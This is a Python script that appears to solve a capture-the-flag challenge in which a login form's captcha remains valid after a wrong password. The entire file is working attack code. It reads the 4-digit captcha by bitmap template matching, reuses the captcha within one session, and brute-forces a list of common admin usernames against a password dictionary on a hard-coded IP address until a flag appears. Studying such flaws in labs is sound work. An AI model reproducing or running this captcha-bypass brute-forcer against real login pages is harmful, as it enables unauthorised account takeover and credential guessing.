#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
11-brute-captcha-flaw solver.

The flaw: after a correct captcha is submitted with a wrong password, the same
captcha remains valid in the same session. This script recognizes one captcha
per user/session and reuses it across the password dictionary. If the server
ever reports a captcha error, it refreshes the session and keeps going.

The captcha is a fixed-font 4-digit image on a flat background with no noise or
distortion, so every glyph is pixel-identical across challenges. That makes a
heavy neural OCR (ddddocr/onnxruntime, ~127 MB) unnecessary: we match each
digit against a built-in 14x18 bitmap template instead. This is dependency-free
(Pillow only) and is actually more accurate here, since ddddocr frequently
misreads the digit 0 as the letter 'o'.
"""

import argparse
import io
import os
import random
import re
import sys
import time
from pathlib import Path
from urllib.parse import urljoin

import requests
from PIL import Image

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://47.120.76.57:35279/")
DEFAULT_USERS = [
    "admin",
    "administrator",
    "root",
    "test",
    "user",
    "guest",
    "ctf",
    "gkd",
    "gkdctf",
    "togogo",
    "flag",
    "manager",
    "webadmin",
    "sysadmin",
    "superadmin",
]
DEFAULT_PASSWORD_FILE = Path(__file__).with_name("password2.txt")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
BAD_LOGIN_MARK = "用户名或密码错误"
BAD_CAPTCHA_MARK = "验证码"

# Normalized glyph size used for both templates and recognition.
GLYPH_W, GLYPH_H = 14, 18
# Pixels darker than this are treated as foreground (digit ink).
INK_THRESHOLD = 150
# Row-major bitmaps for digits 0-9, packed as hex (GLYPH_W * GLYPH_H bits each).
DIGIT_TEMPLATES_HEX = {
    "0": "07801e00fc07f83873c0fe01f807f03fc0fe01f807f03ce1c1fe03f007801e0",
    "1": "07803e01f81fe0ff803e007801e007801e007801e007801e007801e0fffffff",
    "2": "0fc07f83871e1ef03c007003c01e007007801c01e007007803c00e00fffffff",
    "3": "3fc1ff8f07380e003c00e00701f807e001c007800f001c00fe07bc1c7fe0ff0",
    "4": "007003c01f00fc07f03fc1e70f1c3873c1cf0fbffffffc01c007001c007001c",
    "5": "fff3ffcf003800f0038f0e7e3e3cf87000f001c007001fc0f7878e1c1fe03f0",
    "6": "0fc07f83871e1cf033800e0038f0f7e3e1cf87bc0fe01fc0f7878e1c1fe03f0",
    "7": "fffffff003c007003c01e007007801c01e007003801c00e00f003800e003c00",
    "8": "0fc07f83871c0ef03dc0e38707f81fe0e1c787bc0fe01fc0f7878e1c1fe03f0",
    "9": "0fc07f83871e1ef03f807f03de1f387c7ef0f1c007001cc0f3878e1c1fe03f0",
}


def _decode_template(hex_str: str) -> list[int]:
    bits = bin(int(hex_str, 16))[2:].zfill(GLYPH_W * GLYPH_H)
    return [1 if c == "1" else 0 for c in bits]


DIGIT_TEMPLATES = {d: _decode_template(h) for d, h in DIGIT_TEMPLATES_HEX.items()}


def normalize_base_url(url: str) -> str:
    return url.rstrip("/") + "/"


def load_passwords(path: Path) -> list[str]:
    seen: set[str] = set()
    passwords: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        pwd = line.strip()
        if not pwd or pwd.startswith("#") or pwd in seen:
            continue
        seen.add(pwd)
        passwords.append(pwd)
    return passwords


def _column_bands(binary: Image.Image) -> list[tuple[int, int]]:
    px = binary.load()
    w, h = binary.size
    bands: list[tuple[int, int]] = []
    in_band = False
    start = 0
    for x in range(w):
        has_ink = any(px[x, y] for y in range(h))
        if has_ink and not in_band:
            in_band = True
            start = x
        elif not has_ink and in_band:
            in_band = False
            bands.append((start, x))
    if in_band:
        bands.append((start, w))
    return bands


def _glyph_bits(binary: Image.Image, x0: int, x1: int) -> list[int] | None:
    px = binary.load()
    h = binary.size[1]
    rows = [y for y in range(h) if any(px[x, y] for x in range(x0, x1))]
    if not rows:
        return None
    glyph = binary.crop((x0, rows[0], x1, rows[-1] + 1)).resize((GLYPH_W, GLYPH_H))
    gpx = glyph.load()
    return [1 if gpx[gx, gy] > 127 else 0 for gy in range(GLYPH_H) for gx in range(GLYPH_W)]


def recognize_captcha(img_bytes: bytes) -> str:
    image = Image.open(io.BytesIO(img_bytes)).convert("L")
    binary = image.point(lambda v: 255 if v < INK_THRESHOLD else 0)
    code = ""
    for x0, x1 in _column_bands(binary):
        bits = _glyph_bits(binary, x0, x1)
        if bits is None:
            continue
        best_digit = min(
            DIGIT_TEMPLATES,
            key=lambda d: sum(a != b for a, b in zip(bits, DIGIT_TEMPLATES[d])),
        )
        code += best_digit
    return code


def response_preview(text: str, limit: int = 120) -> str:
    text = re.sub(r"\s+", " ", text or "").strip()
    if len(text) <= limit:
        return text
    return text[:limit] + "..."


class CaptchaBruter:
    def __init__(self, base_url: str, timeout: float, captcha_retries: int, show_debug: bool):
        self.base_url = normalize_base_url(base_url)
        self.timeout = timeout
        self.captcha_retries = captcha_retries
        self.show_debug = show_debug

    def new_session(self) -> requests.Session:
        session = requests.Session()
        session.trust_env = False
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        return session

    def get_captcha(self, session: requests.Session) -> str:
        for _ in range(self.captcha_retries):
            resp = session.get(
                urljoin(self.base_url, "yanzhengma.php"),
                params={"nocache": str(random.random())},
                timeout=self.timeout,
            )
            resp.raise_for_status()
            code = recognize_captcha(resp.content)
            if len(code) == 4:
                if self.show_debug:
                    print(f"    [captcha] recognized -> {code}")
                return code
            if self.show_debug:
                print(f"    [captcha] got {len(code)} digits ({code!r}), retrying")
            time.sleep(0.1)
        raise RuntimeError("captcha recognition failed too many times")

    def login_once(self, session: requests.Session, username: str, password: str, code: str) -> str:
        resp = session.post(
            urljoin(self.base_url, "login.php"),
            data={"name": username, "pwd": password, "yzm": code, "login": "登录"},
            timeout=self.timeout,
            allow_redirects=True,
        )
        return resp.text

    def crack_user(
        self,
        username: str,
        passwords: list[str],
        progress_start: int,
        progress_total: int,
        quiet: bool,
    ) -> tuple[str, str | None] | None:
        session = self.new_session()
        code = self.get_captcha(session)
        print(f"[*] user={username}, reusable captcha={code}")

        for offset, password in enumerate(passwords, start=1):
            current = progress_start + offset - 1
            if not quiet:
                print(f"[*] {current}/{progress_total}: {username}:{password}")

            # Keep retrying this password until it is actually tested against a
            # captcha the server accepts, so a stale captcha never causes us to
            # silently skip a candidate password.
            while True:
                body = self.login_once(session, username, password, code)

                flag = FLAG_RE.search(body)
                if flag:
                    print(f"    [+] captcha={code} accepted")
                    return password, flag.group(0)

                if BAD_LOGIN_MARK in body:
                    if self.show_debug:
                        print(f"    [-] failed: {response_preview(body)}")
                    break

                if BAD_CAPTCHA_MARK in body:
                    print("    [~] captcha rejected, refreshing session")
                    session = self.new_session()
                    code = self.get_captcha(session)
                    print(f"    [~] new reusable captcha={code}")
                    continue

                # Unknown response might be a successful body without a flag, so
                # return it to the caller instead of silently skipping it.
                print(f"    [!] unexpected response: {response_preview(body)}")
                return password, None

        return None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve 11-brute-captcha-flaw")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target base URL, default: {DEFAULT_URL}")
    parser.add_argument("--users", default=",".join(DEFAULT_USERS), help="comma-separated usernames")
    parser.add_argument("--password-file", default=str(DEFAULT_PASSWORD_FILE), help="password dictionary")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP timeout seconds")
    parser.add_argument("--captcha-retries", type=int, default=10, help="recognition retries before one login attempt")
    parser.add_argument("--debug", action="store_true", help="print recognition details and failed response previews")
    parser.add_argument("--quiet", action="store_true", help="print less progress while brute forcing")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    users = [u.strip() for u in args.users.split(",") if u.strip()]
    password_file = Path(args.password_file).expanduser()

    try:
        passwords = load_passwords(password_file)
    except Exception as exc:
        print(f"[-] Failed to load passwords: {exc}", file=sys.stderr)
        return 2

    print(f"[*] target: {normalize_base_url(args.url)}")
    print(f"[*] users: {users}")
    print(f"[*] passwords: {len(passwords)} loaded from {password_file}")

    bruter = CaptchaBruter(args.url, args.timeout, args.captcha_retries, args.debug)
    total = len(users) * len(passwords)

    try:
        for user_index, username in enumerate(users):
            result = bruter.crack_user(
                username,
                passwords,
                progress_start=(user_index * len(passwords)) + 1,
                progress_total=total,
                quiet=args.quiet,
            )
            if result is None:
                continue

            password, flag = result
            print("\n[+] Found valid credential")
            print(f"[+] username = {username}")
            print(f"[+] password = {password}")
            if flag:
                print(f"[+] flag     = {flag}")
            else:
                print("[!] Login looked successful, but no TOGOGO flag was found in the response.")
            return 0
    except KeyboardInterrupt:
        print("\n[-] interrupted")
        return 130
    except requests.RequestException as exc:
        print(f"\n[-] request failed: {exc}", file=sys.stderr)
        return 1

    print("[-] not found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
